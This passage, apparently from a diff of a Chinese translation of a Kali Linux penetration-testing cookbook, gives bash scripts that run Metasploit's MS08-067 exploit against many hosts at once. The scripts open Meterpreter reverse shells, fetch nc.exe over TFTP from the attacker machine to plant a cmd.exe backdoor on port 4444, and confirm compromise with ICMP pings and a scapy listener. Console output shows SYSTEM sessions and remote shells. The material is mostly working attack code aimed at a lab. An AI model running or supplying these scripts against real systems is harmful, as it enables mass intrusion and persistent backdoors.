shell</code>&#x53EF;&#x4EE5;&#x6267;&#x884C;&#x5982;&#x4E0B;&#xFF1A;</p>
+<pre><code>root@KaliLinux:~# ./multipwn.sh 
+Usage: #./script &lt;host file&gt; &lt;LHOST&gt; 
+root@KaliLinux:~# ./multipwn.sh iplist.txt 172.16.36.239 
+Exploiting 172.16.36.132 and establishing reverse connection on local port 4444 
+Exploiting 172.16.36.158 and establishing reverse connection on local port 4445 
+Exploiting 172.16.36.225 and establishing reverse connection on local port 4446
+</code></pre><p>&#x5982;&#x679C;&#x5728;&#x4E0D;&#x63D0;&#x4F9B;&#x4EFB;&#x4F55;&#x53C2;&#x6570;&#x7684;&#x60C5;&#x51B5;&#x4E0B;&#x6267;&#x884C;&#x811A;&#x672C;&#xFF0C;&#x811A;&#x672C;&#x5C06;&#x8F93;&#x51FA;&#x76F8;&#x5E94;&#x7684;&#x7528;&#x6CD5;&#x3002; &#x8BE5;&#x4F7F;&#x7528;&#x63CF;&#x8FF0;&#x5C06;&#x8868;&#x660E;&#xFF0C;&#x8BE5;&#x811A;&#x672C;&#x4EE5;&#x5B9A;&#x4E49;&#x76D1;&#x542C; IP &#x7CFB;&#x7EDF;&#x7684;<code>LHOST</code>&#x53D8;&#x91CF;&#xFF0C;&#x4EE5;&#x53CA;&#x5305;&#x542B;&#x76EE;&#x6807; IP &#x5730;&#x5740;&#x5217;&#x8868;&#x7684;&#x6587;&#x672C;&#x6587;&#x4EF6;&#x7684;&#x6587;&#x4EF6;&#x540D;&#x6765;&#x6267;&#x884C;&#x3002; &#x4E00;&#x65E6;&#x4EE5;&#x8FD9;&#x4E9B;&#x53C2;&#x6570;&#x6267;&#x884C;&#xFF0C;&#x4F1A;&#x5F00;&#x59CB;&#x5F39;&#x51FA;&#x4E00;&#x7CFB;&#x5217;&#x65B0;&#x7684;&#x7EC8;&#x7AEF;&#x3002; &#x8FD9;&#x4E9B;&#x7EC8;&#x7AEF;&#x4E2D;&#x7684;&#x6BCF;&#x4E00;&#x4E2A;&#x5C06;&#x8FD0;&#x884C;&#x8F93;&#x5165;&#x5217;&#x8868;&#x4E2D;&#x7684; IP &#x5730;&#x5740;&#x4E4B;&#x4E00;&#x7684;&#x5229;&#x7528;&#x5E8F;&#x5217;&#x3002; &#x539F;&#x59CB;&#x7684;&#x6267;&#x884C;&#x7EC8;&#x7AEF;&#x5C06;&#x5728;&#x6267;&#x884C;&#x65F6;&#x8F93;&#x51FA;&#x8FDB;&#x7A0B;&#x5217;&#x8868;&#x3002; &#x6240;&#x63D0;&#x4F9B;&#x7684;&#x793A;&#x4F8B;&#x5229;&#x7528;&#x4E86;&#x4E09;&#x4E2A;&#x4E0D;&#x540C;&#x7684;&#x7CFB;&#x7EDF;&#xFF0C;&#x5E76;&#x4E14;&#x4E3A;&#x6BCF;&#x4E2A;&#x7CFB;&#x7EDF;&#x6253;&#x5F00;&#x5355;&#x72EC;&#x7684;&#x7EC8;&#x7AEF;&#x3002;&#x5176;&#x4E2D;&#x4E00;&#x4E2A;&#x7EC8;&#x7AEF;&#x7684;&#x793A;&#x4F8B;&#x5982;&#x4E0B;&#xFF1A;</p>
+<pre><code>[*] Please wait while we load the module tree...
+     ,           ,    
+    /             \  
+   ((__---,,,---__))   
+      (_) O O (_)_________    
+         \ _ /            |\    
+          o_o \   M S F   | \  
+               \   _____  |  *    
+                |||   WW|||      
+                |||     |||
+
+Frustrated with proxy pivoting? Upgrade to layer-2 VPN pivoting with Metasploit Pro -- type &apos;go_pro&apos; to launch it now.
+
+       =[ metasploit v4.6.0-dev [core:4.6 api:1.0] 
++ -- --=[ 1053 exploits - 590 auxiliary - 174 post 
++ -- --=[ 275 payloads - 28 encoders - 8 nops
+
+PAYLOAD =&gt; windows/meterpreter/reverse_tcp 
+RHOST =&gt; 172.16.36.225 
+LHOST =&gt; 172.16.36.239 
+LPORT =&gt; 4446 
+[*] Started reverse handler on 172.16.36.239:4446 
+[*] Automatically detecting the target... 
+[*] Fingerprint: Windows XP - Service Pack 2 - lang:English 
+[*] Selected Target: Windows XP SP2 English (AlwaysOn NX) 
+[*] Attempting to trigger the vulnerability...
+[*] Sending stage (752128 bytes) to 172.16.36.225 
+[*] Meterpreter session 1 opened (172.16.36.239:4446 -&gt; 172.16.36.225:1950) at 2014-04-10 07:12:44 -0400
+
+meterpreter &gt; getuid 
+Server username: NT AUTHORITY\SYSTEM 
+meterpreter &gt;
+</code></pre><p>&#x6BCF;&#x4E2A;&#x7EC8;&#x7AEF;&#x542F;&#x52A8;&#x5355;&#x72EC;&#x7684; MSFCLI &#x5B9E;&#x4F8B;&#x5E76;&#x6267;&#x884C;&#x5229;&#x7528;&#x3002; &#x5047;&#x8BBE;&#x653B;&#x51FB;&#x6210;&#x529F;&#xFF0C;&#x4F1A;&#x6267;&#x884C;&#x8F7D;&#x8377;&#xFF0C;&#x5E76;&#x4E14;&#x4EA4;&#x4E92;&#x5F0F; Meterpreter shell &#x5C06;&#x5728;&#x6BCF;&#x4E2A;&#x5355;&#x72EC;&#x7684;&#x7EC8;&#x7AEF;&#x4E2D;&#x53EF;&#x7528;&#x3002;</p>
+<h3 id="&#x5DE5;&#x4F5C;&#x539F;&#x7406;">&#x5DE5;&#x4F5C;&#x539F;&#x7406;</h3>
+<p>&#x901A;&#x8FC7;&#x5BF9;&#x6BCF;&#x4E2A;&#x8FDB;&#x7A0B;&#x4F7F;&#x7528;&#x5355;&#x72EC;&#x7684;&#x7EC8;&#x7AEF;&#xFF0C;&#x53EF;&#x4EE5;&#x4F7F;&#x7528;&#x5355;&#x4E2A; bash &#x811A;&#x672C;&#x6267;&#x884C;&#x591A;&#x4E2A;&#x5E76;&#x884C;&#x5229;&#x7528;&#x3002; &#x53E6;&#x5916;&#xFF0C;&#x901A;&#x8FC7;&#x4F7F;&#x7528;&#x4E3A;<code>LPORT</code>&#x5206;&#x914D;&#x7684;&#x9012;&#x589E;&#x503C;&#xFF0C;&#x53EF;&#x4EE5;&#x540C;&#x65F6;&#x6267;&#x884C;&#x591A;&#x4E2A;&#x53CD;&#x5411; meterpreter shell&#x3002;</p>
+<h2 id="86-&#x4F7F;&#x7528;&#x53EF;&#x6267;&#x884C;&#x540E;&#x95E8;&#x7684;&#x591A;&#x7EBF;&#x7A0B;-msf-&#x5229;&#x7528;">8.6 &#x4F7F;&#x7528;&#x53EF;&#x6267;&#x884C;&#x540E;&#x95E8;&#x7684;&#x591A;&#x7EBF;&#x7A0B; MSF &#x5229;&#x7528;</h2>
+<p>&#x8BE5;&#x79D8;&#x7C4D;&#x6F14;&#x793A;&#x4E86;&#x5982;&#x4F55;&#x4F7F;&#x7528; bash &#xFF0C;&#x5728;&#x591A;&#x4E2A;&#x7CFB;&#x7EDF;&#x4E0A;&#x5229;&#x7528;&#x5355;&#x4E2A;&#x6F0F;&#x6D1E;&#xFF0C;&#x5E76;&#x5728;&#x6BCF;&#x4E2A;&#x7CFB;&#x7EDF;&#x4E0A;&#x6253;&#x5F00;&#x4E00;&#x4E2A;&#x540E;&#x95E8;&#x3002; &#x540E;&#x95E8;&#x5305;&#x62EC;&#x5728;&#x76EE;&#x6807;&#x7CFB;&#x7EDF;&#x4E0A;&#x6682;&#x5B58; Netcat &#x53EF;&#x6267;&#x884C;&#x6587;&#x4EF6;&#xFF0C;&#x5E76;&#x6253;&#x5F00;&#x76D1;&#x542C;&#x670D;&#x52A1;&#xFF0C;&#x5728;&#x6536;&#x5230;&#x8FDE;&#x63A5;&#x540E;&#x6267;&#x884C;<code>cmd.exe</code>&#x3002;</p>
+<h3 id="&#x51C6;&#x5907;">&#x51C6;&#x5907;</h3>
+<p>&#x8981;&#x4F7F;&#x7528;&#x6B64;&#x79D8;&#x7C4D;&#x4E2D;&#x6F14;&#x793A;&#x7684;&#x811A;&#x672C;&#xFF0C;&#x4F60;&#x9700;&#x8981;&#x8BBF;&#x95EE;&#x591A;&#x4E2A;&#x7CFB;&#x7EDF;&#xFF0C;&#x6BCF;&#x4E2A;&#x7CFB;&#x7EDF;&#x90FD;&#x5177;&#x6709;&#x53EF;&#x4F7F;&#x7528; Metasploit &#x5229;&#x7528;&#x7684;&#x76F8;&#x540C;&#x6F0F;&#x6D1E;&#x3002; &#x63D0;&#x4F9B;&#x7684;&#x793A;&#x4F8B;&#x590D;&#x5236;&#x4E86;&#x8FD0;&#x884C; Windows XP &#x6F0F;&#x6D1E;&#x7248;&#x672C;&#x7684; VM&#xFF0C;&#x6765;&#x751F;&#x6210; MS08-067 &#x6F0F;&#x6D1E;&#x7684;&#x4E09;&#x4E2A;&#x5B9E;&#x4F8B;&#x3002; &#x6709;&#x5173;&#x8BBE;&#x7F6E; Windows &#x7CFB;&#x7EDF;&#x7684;&#x66F4;&#x591A;&#x4FE1;&#x606F;&#xFF0C;&#x8BF7;&#x53C2;&#x9605;&#x672C;&#x4E66;&#x7B2C;&#x4E00;&#x7AE0;&#x4E2D;&#x7684;&#x201C;&#x5B89;&#x88C5; Windows Server&#x201D;&#x79D8;&#x7C4D;&#x3002; &#x6B64;&#x5916;&#xFF0C;&#x672C;&#x8282;&#x8FD8;&#x9700;&#x8981;&#x4F7F;&#x7528;&#x6587;&#x672C;&#x7F16;&#x8F91;&#x5668;&#xFF08;&#x5982; VIM &#x6216; Nano&#xFF09;&#x5C06;&#x811A;&#x672C;&#x5199;&#x5165;&#x6587;&#x4EF6;&#x7CFB;&#x7EDF;&#x3002; &#x6709;&#x5173;&#x7F16;&#x5199;&#x811A;&#x672C;&#x7684;&#x66F4;&#x591A;&#x4FE1;&#x606F;&#xFF0C;&#x8BF7;&#x53C2;&#x9605;&#x672C;&#x4E66;&#x7B2C;&#x4E00;&#x7AE0;&#x7684;&#x201C;&#x4F7F;&#x7528;&#x6587;&#x672C;&#x7F16;&#x8F91;&#x5668;&#xFF08;VIM &#x548C; Nano&#xFF09;&#x201D;&#x79D8;&#x7C4D;&#x3002;</p>
+<h3 id="&#x64CD;&#x4F5C;&#x6B65;&#x9AA4;">&#x64CD;&#x4F5C;&#x6B65;&#x9AA4;</h3>
+<p>&#x4E0B;&#x9762;&#x7684;&#x793A;&#x4F8B;&#x6F14;&#x793A;&#x4E86;&#x5982;&#x4F55;&#x4F7F;&#x7528; bash &#x811A;&#x672C;&#x540C;&#x65F6;&#x5229;&#x7528;&#x5355;&#x4E2A;&#x6F0F;&#x6D1E;&#x7684;&#x591A;&#x4E2A;&#x5B9E;&#x4F8B;&#x3002; &#x7279;&#x522B;&#x662F;&#xFF0C;&#x6B64;&#x811A;&#x672C;&#x53EF;&#x7528;&#x4E8E;&#x901A;&#x8FC7;&#x5F15;&#x7528; IP &#x5730;&#x5740;&#x7684;&#x8F93;&#x5165;&#x5217;&#x8868;&#xFF0C;&#x6765;&#x5229;&#x7528; MS08-067 NetAPI &#x6F0F;&#x6D1E;&#x7684;&#x591A;&#x4E2A;&#x5B9E;&#x4F8B;&#xFF1A;</p>
+<pre><code class="lang-sh"><span class="hljs-meta">#!/bin/bash</span>
+<span class="hljs-keyword">if</span> [ ! <span class="hljs-variable">$1</span> ]; <span class="hljs-keyword">then</span> <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;Usage: #./script &lt;host file&gt;&quot;</span>; 
+<span class="hljs-built_in">exit</span>; <span class="hljs-keyword">fi</span>
+
+iplist=<span class="hljs-variable">$1</span>
+
+<span class="hljs-keyword">for</span> ip <span class="hljs-keyword">in</span> $(cat <span class="hljs-variable">$iplist</span>) 
+<span class="hljs-keyword">do</span>   
+    gnome-terminal -x msfcli exploit/windows/smb/ms08_067_netapi PAYLOAD=windows/<span class="hljs-built_in">exec</span> CMD=<span class="hljs-string">&quot;cmd.exe /c \&quot;tftp -i 172.16.36.239 GET nc.exe &amp;&amp; nc.exe -lvp 4444 -e cmd.exe\&quot;&quot;</span> RHOST=<span class="hljs-variable">$ip</span> E   
+    <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;Exploiting <span class="hljs-variable">$ip</span> and creating backdoor on TCP port 4444&quot;</span> 
+<span class="hljs-keyword">done</span>
+</code></pre>
+<p>&#x6B64;&#x811A;&#x672C;&#x4E0E;&#x4E0A;&#x4E00;&#x4E2A;&#x79D8;&#x7C4D;&#x4E2D;&#x8BA8;&#x8BBA;&#x7684;&#x811A;&#x672C;&#x4E0D;&#x540C;&#xFF0C;&#x56E0;&#x4E3A;&#x6B64;&#x811A;&#x672C;&#x5728;&#x6BCF;&#x4E2A;&#x76EE;&#x6807;&#x4E0A;&#x5B89;&#x88C5;&#x4E00;&#x4E2A;&#x540E;&#x95E8;&#x3002; &#x5728;&#x6BCF;&#x4E2A;&#x88AB;&#x5229;&#x7528;&#x7684;&#x7CFB;&#x7EDF;&#x4E0A;&#xFF0C;&#x4F1A;&#x6267;&#x884C;&#x4E00;&#x4E2A;&#x8F7D;&#x8377;&#xFF0C;&#x5B83;&#x4F7F;&#x7528;&#x96C6;&#x6210;&#x7684;&#x7B80;&#x5355;&#x6587;&#x4EF6;&#x4F20;&#x8F93;&#x534F;&#x8BAE;&#xFF08;TFTP&#xFF09;&#x5BA2;&#x6237;&#x7AEF;&#x6765;&#x6293;&#x53D6; Netcat &#x53EF;&#x6267;&#x884C;&#x6587;&#x4EF6;&#xFF0C;&#x7136;&#x540E;&#x4F7F;&#x7528;&#x5B83;&#x5728; TCP &#x7AEF;&#x53E3; 4444 &#x4E0A;&#x6253;&#x5F00;&#x4E00;&#x4E2A;<code>cmd.exe</code>&#x76D1;&#x542C;&#x7EC8;&#x7AEF;&#x670D;&#x52A1;&#x3002;&#x4E3A;&#x6B64;&#xFF0C; TFTP &#x670D;&#x52A1;&#x5C06;&#x9700;&#x8981;&#x5728; Kali &#x7CFB;&#x7EDF;&#x4E0A;&#x8FD0;&#x884C;&#x3002; &#x8FD9;&#x53EF;&#x4EE5;&#x901A;&#x8FC7;&#x6267;&#x884C;&#x4EE5;&#x4E0B;&#x547D;&#x4EE4;&#x6765;&#x5B8C;&#x6210;&#xFF1A;</p>
+<pre><code>root@KaliLinux:~# atftpd --daemon --port 69 /tmp 
+root@KaliLinux:~# cp /usr/share/windows-binaries/nc.exe /tmp/nc.exe
+</code></pre><p>&#x7B2C;&#x4E00;&#x4E2A;&#x547D;&#x4EE4;&#x5728; UDP &#x7AEF;&#x53E3; 69 &#x4E0A;&#x542F;&#x52A8; TFTP &#x670D;&#x52A1;&#xFF0C;&#x670D;&#x52A1;&#x76EE;&#x5F55;&#x5728;<code>/ tmp</code>&#x4E2D;&#x3002; &#x7B2C;&#x4E8C;&#x4E2A;&#x547D;&#x4EE4;&#x7528;&#x4E8E;&#x5C06; Netcat &#x53EF;&#x6267;&#x884C;&#x6587;&#x4EF6;&#x4ECE;<code>Windows-binaries</code>&#x6587;&#x4EF6;&#x5939;&#x590D;&#x5236;&#x5230; TFTP &#x76EE;&#x5F55;&#x3002; &#x73B0;&#x5728;&#x6211;&#x4EEC;&#x6267;&#x884C;<code>./multipwn.sh</code> bash shell&#xFF1A;</p>
+<pre><code>root@KaliLinux:~# ./multipwn.sh 
+Usage: #./script &lt;host file&gt; 
+root@KaliLinux:~# ./multipwn.sh iplist.txt 
+Exploiting 172.16.36.132 and creating backdoor on TCP port 4444 
+Exploiting 172.16.36.158 and creating backdoor on TCP port 4444 
+Exploiting 172.16.36.225 and creating backdoor on TCP port 4444
+</code></pre><p>&#x5982;&#x679C;&#x5728;&#x4E0D;&#x63D0;&#x4F9B;&#x4EFB;&#x4F55;&#x53C2;&#x6570;&#x7684;&#x60C5;&#x51B5;&#x4E0B;&#x6267;&#x884C;&#x811A;&#x672C;&#xFF0C;&#x811A;&#x672C;&#x5C06;&#x8F93;&#x51FA;&#x76F8;&#x5E94;&#x7684;&#x7528;&#x6CD5;&#x3002; &#x8BE5;&#x4F7F;&#x7528;&#x63CF;&#x8FF0;&#x8868;&#x660E;&#xFF0C;&#x8BE5;&#x811A;&#x672C;&#x5E94;&#x8BE5;&#x4EE5;&#x4E00;&#x4E2A;&#x53C2;&#x6570;&#x6267;&#x884C;&#xFF0C;&#x8BE5;&#x53C2;&#x6570;&#x6307;&#x5B9A;&#x4E86;&#x5305;&#x542B;&#x76EE;&#x6807; IP &#x5730;&#x5740;&#x5217;&#x8868;&#x7684;&#x6587;&#x672C;&#x6587;&#x4EF6;&#x7684;&#x6587;&#x4EF6;&#x540D;&#x3002; &#x4E00;&#x65E6;&#x4EE5;&#x8FD9;&#x4E2A;&#x53C2;&#x6570;&#x6267;&#x884C;&#xFF0C;&#x4F1A;&#x5F00;&#x59CB;&#x5F39;&#x51FA;&#x4E00;&#x7CFB;&#x5217;&#x65B0;&#x7684;&#x7EC8;&#x7AEF;&#x3002; &#x8FD9;&#x4E9B;&#x7EC8;&#x7AEF;&#x4E2D;&#x7684;&#x6BCF;&#x4E00;&#x4E2A;&#x5C06;&#x8FD0;&#x884C;&#x8F93;&#x5165;&#x5217;&#x8868;&#x4E2D;&#x7684; IP &#x5730;&#x5740;&#x4E4B;&#x4E00;&#x7684;&#x5229;&#x7528;&#x5E8F;&#x5217;&#x3002; &#x539F;&#x59CB;&#x6267;&#x884C;&#x7EC8;&#x7AEF;&#x5728;&#x5B83;&#x4EEC;&#x88AB;&#x6267;&#x884C;&#x65F6;&#x8F93;&#x51FA;&#x8FDB;&#x7A0B;&#x5217;&#x8868;&#xFF0C;&#x5E76;&#x4E14;&#x8868;&#x660E;&#x5728;&#x6BCF;&#x4E2A;&#x7EC8;&#x7AEF;&#x4E0A;&#x521B;&#x5EFA;&#x540E;&#x95E8;&#x3002; &#x5728;&#x6BCF;&#x4E2A;&#x7EC8;&#x7AEF;&#x4E2D;&#x5B8C;&#x6210;&#x5229;&#x7528;&#x5E8F;&#x5217;&#x4E4B;&#x540E;&#xFF0C;Netcat &#x53EF;&#x4EE5;&#x7528;&#x4E8E;&#x8FDE;&#x63A5;&#x5230;&#x7531;&#x8F7D;&#x8377;&#x6253;&#x5F00;&#x7684;&#x8FDC;&#x7A0B;&#x670D;&#x52A1;&#xFF1A;</p>
+<pre><code>root@KaliLinux:~# nc -nv 172.16.36.225 4444 
+(UNKNOWN) [172.16.36.225] 4444 (?) open 
+Microsoft Windows XP [Version 5.1.2600] 
+(C) Copyright 1985-2001 Microsoft Corp.
+
+C:\&gt;
+</code></pre><p>&#x5728;&#x63D0;&#x4F9B;&#x7684;&#x793A;&#x4F8B;&#x4E2D;&#xFF0C;IP &#x5730;&#x5740;&#x4E3A;<code>172.16.36.225</code>&#x7684;&#x88AB;&#x5229;&#x7528;&#x7684;&#x7CFB;&#x7EDF;&#x4E0A;&#x7684; TCP 4444 &#x7AEF;&#x53E3;&#x7684;&#x8FDE;&#x63A5;&#xFF0C;&#x4F1A;&#x751F;&#x6210;&#x53EF;&#x8FDC;&#x7A0B;&#x8BBF;&#x95EE;&#x7684;<code>cmd.exe</code>&#x7EC8;&#x7AEF;&#x670D;&#x52A1;&#x3002;</p>
+<h3 id="&#x5DE5;&#x4F5C;&#x539F;&#x7406;">&#x5DE5;&#x4F5C;&#x539F;&#x7406;</h3>
+<p>Netcat &#x662F;&#x4E00;&#x4E2A;&#x529F;&#x80FD;&#x5F3A;&#x5927;&#x7684;&#x5DE5;&#x5177;&#xFF0C;&#x53EF;&#x4EE5;&#x7528;&#x4E8E;&#x5404;&#x79CD;&#x76EE;&#x7684;&#x3002; &#x867D;&#x7136;&#x8FD9;&#x662F;&#x8FDC;&#x7A0B;&#x6267;&#x884C;&#x670D;&#x52A1;&#x7684;&#x6709;&#x6548;&#x65B9;&#x5F0F;&#xFF0C;&#x4F46;&#x4E0D;&#x5EFA;&#x8BAE;&#x5728;&#x751F;&#x4EA7;&#x7CFB;&#x7EDF;&#x4E0A;&#x4F7F;&#x7528;&#x6B64;&#x6280;&#x672F;&#x3002; &#x8FD9;&#x662F;&#x56E0;&#x4E3A;&#x4EFB;&#x4F55;&#x53EF;&#x4EE5;&#x4E0E;&#x76D1;&#x542C;&#x7AEF;&#x53E3;&#x5EFA;&#x7ACB; TCP &#x8FDE;&#x63A5;&#x7684;&#x4EBA;&#x90FD;&#x53EF;&#x4EE5;&#x8BBF;&#x95EE; Netcat &#x6253;&#x5F00;&#x7684;&#x540E;&#x95E8;&#x3002;</p>
+<h2 id="87-&#x4F7F;&#x7528;-icmp-&#x9A8C;&#x8BC1;&#x591A;&#x7EBF;&#x7A0B;-msf-&#x5229;&#x7528;">8.7 &#x4F7F;&#x7528; ICMP &#x9A8C;&#x8BC1;&#x591A;&#x7EBF;&#x7A0B; MSF &#x5229;&#x7528;</h2>
+<p>&#x8BE5;&#x79D8;&#x7C4D;&#x6F14;&#x793A;&#x4E86;&#x5982;&#x4F55;&#x4F7F;&#x7528; bash &#x5229;&#x7528;&#x8DE8;&#x591A;&#x4E2A;&#x7CFB;&#x7EDF;&#x7684;&#x5355;&#x4E2A;&#x6F0F;&#x6D1E;&#xFF0C;&#x5E76;&#x4F7F;&#x7528; ICMP &#x6D41;&#x91CF;&#x9A8C;&#x8BC1;&#x6BCF;&#x4E2A;&#x6F0F;&#x6D1E;&#x7684;&#x6210;&#x529F;&#x5229;&#x7528;&#x3002; &#x8FD9;&#x79CD;&#x6280;&#x672F;&#x9700;&#x8981;&#x5F88;&#x5C11;&#x7684;&#x5F00;&#x9500;&#xFF0C;&#x5E76;&#x4E14;&#x53EF;&#x4EE5;&#x8F7B;&#x6613;&#x7528;&#x4E8E;&#x6536;&#x96C6;&#x53EF;&#x5229;&#x7528;&#x7684;&#x7CFB;&#x7EDF;&#x5217;&#x8868;&#x3002;</p>
+<h3 id="&#x51C6;&#x5907;">&#x51C6;&#x5907;</h3>
+<p>&#x8981;&#x4F7F;&#x7528;&#x6B64;&#x79D8;&#x7C4D;&#x4E2D;&#x6F14;&#x793A;&#x7684;&#x811A;&#x672C;&#xFF0C;&#x4F60;&#x9700;&#x8981;&#x8BBF;&#x95EE;&#x591A;&#x4E2A;&#x7CFB;&#x7EDF;&#xFF0C;&#x6BCF;&#x4E2A;&#x7CFB;&#x7EDF;&#x90FD;&#x5177;&#x6709;&#x53EF;&#x4F7F;&#x7528; Metasploit &#x5229;&#x7528;&#x7684;&#x76F8;&#x540C;&#x6F0F;&#x6D1E;&#x3002; &#x63D0;&#x4F9B;&#x7684;&#x793A;&#x4F8B;&#x590D;&#x5236;&#x4E86;&#x8FD0;&#x884C; Windows XP &#x6F0F;&#x6D1E;&#x7248;&#x672C;&#x7684; VM&#xFF0C;&#x6765;&#x751F;&#x6210; MS08-067 &#x6F0F;&#x6D1E;&#x7684;&#x4E09;&#x4E2A;&#x5B9E;&#x4F8B;&#x3002; &#x6709;&#x5173;&#x8BBE;&#x7F6E; Windows &#x7CFB;&#x7EDF;&#x7684;&#x66F4;&#x591A;&#x4FE1;&#x606F;&#xFF0C;&#x8BF7;&#x53C2;&#x9605;&#x672C;&#x4E66;&#x7B2C;&#x4E00;&#x7AE0;&#x4E2D;&#x7684;&#x201C;&#x5B89;&#x88C5; Windows Server&#x201D;&#x79D8;&#x7C4D;&#x3002; &#x6B64;&#x5916;&#xFF0C;&#x672C;&#x8282;&#x8FD8;&#x9700;&#x8981;&#x4F7F;&#x7528;&#x6587;&#x672C;&#x7F16;&#x8F91;&#x5668;&#xFF08;&#x5982; VIM &#x6216; Nano&#xFF09;&#x5C06;&#x811A;&#x672C;&#x5199;&#x5165;&#x6587;&#x4EF6;&#x7CFB;&#x7EDF;&#x3002; &#x6709;&#x5173;&#x7F16;&#x5199;&#x811A;&#x672C;&#x7684;&#x66F4;&#x591A;&#x4FE1;&#x606F;&#xFF0C;&#x8BF7;&#x53C2;&#x9605;&#x672C;&#x4E66;&#x7B2C;&#x4E00;&#x7AE0;&#x7684;&#x201C;&#x4F7F;&#x7528;&#x6587;&#x672C;&#x7F16;&#x8F91;&#x5668;&#xFF08;VIM &#x548C; Nano&#xFF09;&#x201D;&#x79D8;&#x7C4D;&#x3002;</p>
+<h3 id="&#x64CD;&#x4F5C;&#x6B65;&#x9AA4;">&#x64CD;&#x4F5C;&#x6B65;&#x9AA4;</h3>
+<p>&#x4E0B;&#x9762;&#x7684;&#x793A;&#x4F8B;&#x6F14;&#x793A;&#x4E86;&#x5982;&#x4F55;&#x4F7F;&#x7528; bash &#x811A;&#x672C;&#x540C;&#x65F6;&#x5229;&#x7528;&#x5355;&#x4E2A;&#x6F0F;&#x6D1E;&#x7684;&#x591A;&#x4E2A;&#x5B9E;&#x4F8B;&#x3002; &#x7279;&#x522B;&#x662F;&#xFF0C;&#x6B64;&#x811A;&#x672C;&#x53EF;&#x7528;&#x4E8E;&#x901A;&#x8FC7;&#x5F15;&#x7528; IP &#x5730;&#x5740;&#x7684;&#x8F93;&#x5165;&#x5217;&#x8868;&#x6765;&#x5229;&#x7528; MS08-067 NetAPI &#x6F0F;&#x6D1E;&#x7684;&#x591A;&#x4E2A;&#x5B9E;&#x4F8B;&#xFF1A;</p>
+<pre><code class="lang-sh"><span class="hljs-meta">#!/bin/bash</span>
+<span class="hljs-keyword">if</span> [ ! <span class="hljs-variable">$1</span> ]; <span class="hljs-keyword">then</span> <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;Usage: #./script &lt;host file&gt;&quot;</span>; 
+<span class="hljs-built_in">exit</span>; <span class="hljs-keyword">fi</span>
+
+iplist=<span class="hljs-variable">$1</span>
+
+<span class="hljs-keyword">for</span> ip <span class="hljs-keyword">in</span> $(cat <span class="hljs-variable">$iplist</span>)
+<span class="hljs-keyword">do</span>   
+    gnome-terminal -x msfcli exploit/windows/smb/ms08_067_netapi PAYLOAD=windows/<span class="hljs-built_in">exec</span> CMD=<span class="hljs-string">&quot;cmd.exe /c ping \&quot;172.16.36.239 -n 1 -i 15\&quot;&quot;</span> 
+    RHOST=<span class="hljs-variable">$ip</span> E   
+    <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;Exploiting <span class="hljs-variable">$ip</span> and pinging&quot;</span> 
+<span class="hljs-keyword">done</span>
+</code></pre>
+<p>&#x6B64;&#x811A;&#x672C;&#x4E0E;&#x4E0A;&#x4E00;&#x4E2A;&#x79D8;&#x7C4D;&#x4E2D;&#x8BA8;&#x8BBA;&#x7684;&#x811A;&#x672C;&#x4E0D;&#x540C;&#xFF0C;&#x56E0;&#x4E3A;&#x8F7D;&#x8377;&#x4EC5;&#x4EC5;&#x4ECE;&#x88AB;&#x5229;&#x7528;&#x7CFB;&#x7EDF;&#x5411;&#x653B;&#x51FB;&#x7CFB;&#x7EDF;&#x53D1;&#x56DE; ICMP &#x56DE;&#x54CD;&#x8BF7;&#x6C42;&#x3002; &#x5728;&#x6267;&#x884C;<code>ping</code>&#x547D;&#x4EE4;&#x5E76;&#x4F7F;&#x7528;<code>-i</code>&#x9009;&#x9879;&#x6765;&#x6307;&#x5B9A;&#x751F;&#x5B58;&#x65F6;&#x95F4;&#xFF08;TTL&#xFF09;&#x4E3A;15 &#x65F6;&#x3002;&#x6B64;&#x5907;&#x7528;TTL&#x503C;&#x7528;&#x4E8E;&#x533A;&#x5206;&#x5229;&#x7528;&#x751F;&#x6210;&#x7684;&#x6D41;&#x91CF;&#x4E0E;&#x6B63;&#x5E38; ICMP &#x6D41;&#x91CF;&#x3002; &#x8FD8;&#x5E94;&#x8BE5;&#x6267;&#x884C;&#x5B9A;&#x5236;&#x7684; Python &#x76D1;&#x542C;&#x5668;&#x811A;&#x672C;&#xFF0C;&#x901A;&#x8FC7;&#x63A5;&#x6536; ICMP &#x6D41;&#x91CF;&#x6765;&#x8BC6;&#x522B;&#x88AB;&#x5229;&#x7528;&#x7684;&#x7CFB;&#x7EDF;&#x3002; &#x8FD9;&#x4E2A;&#x811A;&#x672C;&#x5982;&#x4E0B;&#xFF1A;</p>
+<pre><code class="lang-py"><span class="hljs-comment">#!/usr/bin/python</span>
+
+<span class="hljs-keyword">from</span> scapy.all <span class="hljs-keyword">import</span> * 
+<span class="hljs-keyword">import</span> logging 
+logging.getLogger(<span class="hljs-string">&quot;scapy.runtime&quot;</span>).setLevel(logging.ERROR)
+
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">rules</span><span class="hljs-params">(pkt)</span>:</span>   
+    <span class="hljs-keyword">try</span>:      
+        <span class="hljs-keyword">if</span> ((pkt[IP].dst==<span class="hljs-string">&quot;172.16.36.239&quot;</span>) <span class="hljs-keyword">and</span> (pkt[ICMP]) <span class="hljs-keyword">and</span> pkt[IP]. ttl &lt;= <span class="hljs-number">15</span>):         
+            <span class="hljs-keyword">print</span> str(pkt[IP].src) + <span class="hljs-string">&quot; is exploitable&quot;</span>      
+    <span class="hljs-keyword">except</span>:         
+        <span class="hljs-keyword">pass</span>
+
+<span class="hljs-keyword">print</span> <span class="hljs-string">&quot;Listening for Incoming ICMP Traffic. Use Ctrl+C to stop scanning&quot;</span> 
+sniff(lfilter=rules,store=<span class="hljs-number">0</span>)
+</code></pre>
+<p>&#x811A;&#x672C;&#x4FA6;&#x542C;&#x6240;&#x6709;&#x4F20;&#x5165;&#x7684;&#x6D41;&#x91CF;&#x3002; &#x5F53;&#x63A5;&#x6536;&#x5230; TTL &#x503C;&#x4E3A; 15&#x6216; &#x66F4;&#x5C0F;&#x7684; ICMP &#x6570;&#x636E;&#x5305;&#x65F6;&#xFF0C;&#x811A;&#x672C;&#x5C06;&#x7CFB;&#x7EDF;&#x6807;&#x8BB0;&#x4E3A;&#x53EF;&#x5229;&#x7528;&#x3002;</p>
+<pre><code>root@KaliLinux:~# ./listener.py 
+Listening for Incoming ICMP Traffic. Use Ctrl+C to stop scanning
